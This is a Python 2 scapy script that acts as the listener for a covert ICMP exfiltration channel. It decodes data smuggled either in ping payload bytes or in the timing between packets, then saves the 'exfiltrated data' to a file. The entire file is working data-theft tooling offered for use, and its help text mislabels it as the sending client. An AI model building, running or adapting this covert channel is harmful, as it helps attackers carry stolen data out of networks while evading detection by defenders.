from scapy.all import *
import sys, base64, argparse

def raw(p):
    return p[ICMP][Raw].load[16:32]

def isICMP(p):
    return p.haslayer(ICMP) and p[ICMP].type==8

def write(data, filename):
    f = open(filename, "w")
    f.write(data)
    f.close()

def serverLastBytes(interface):

    received = []

    for x in range(4):

        s = sniff(iface=interface, lfilter = lambda packet : isICMP(packet),
                  stop_filter = lambda packet : isICMP(packet) and '\n' in raw(packet))

        buf = [raw(i) for i in s]

        # if interface is loopback for testing purposes,
        # each packet is duplicated so we need to remove it

        if interface == "lo":
            buf = [buf[i] for i in range(len(buf)) if i % 2 == 0]

        buf = ''.join(buf)
        dec = base64.b64decode(buf[:buf.find('\n')])

        print "[*] Buf length   : {}".format(len(buf.encode("hex")))
        print "[*] Received data: \"{}\"".format(dec)
        received.append(dec)

    return "\n".join(received) + "\n"

def serverTimeBased(interface):

    received = []

    for x in range(4):

        s = sniff(iface=interface, lfilter = lambda packet : isICMP(packet),
                  stop_filter = lambda packet : isICMP(packet) and '\n' in raw(packet))

        # if interface is loopback for testing purposes,
        # each packet is duplicated so we need to remove it

        if interface == "lo":
            s = [s[i] for i in range(len(s)) if i % 2 == 0]

        msg = "1"

        for n in range(1, len(s)):
            diff = int((s[n].time - s[n-1].time) * 10)
            msg += (diff- (1 * (diff % 2 != 0)))/2 * "0" +  ("1" * (diff % 2 != 0))

        data = hex(int(msg, 2))[2:].replace("L", "").decode("hex")
        received.append(data)

        print "[*] Received data: \"{}\"".format(data)

    return "\n".join(received) + "\n"

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Client that sends data disguised in ICMP packets. Keep in mind settings need to be the same for the server')
    parser.add_argument('-o', '--out', type=str, help='write received data on a file')
    parser.add_argument('-m', '--mode', type=int, default=1, help='the mode of exfiltration: 1 is lousy (inside packets), 2 time-based')

    requiredNamed = parser.add_argument_group('required named arguments')
    parser.add_argument('-i', '--interface', type=str, help='interface to listen on', required=True)

    args = parser.parse_args()

    print "[*] Started listener on interface: {}".format(args.interface)
    print "[*] Listening mode: {}".format(args.mode)

    if args.mode == 1:
        out = serverLastBytes(args.interface)
    elif args.mode == 2:
        out = serverTimeBased(args.interface)

    if args.out:
        write(out, args.out)
        print "[*] Exfiltrated data saved to: {}".format(args.out)